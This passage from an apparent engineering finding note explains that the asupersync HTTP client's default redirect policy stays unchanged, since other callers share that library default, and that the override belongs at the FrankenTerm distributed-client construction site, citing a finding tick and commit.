- The asupersync HTTP client's default RedirectPolicy — that's a library
  default and changing it would affect every other caller. The fix is
  to override at the FrankenTerm distributed-client construction site.

## References
- Finding tick: ft-xbnl0.2.4 tick 349 (commit 4013f6e9)
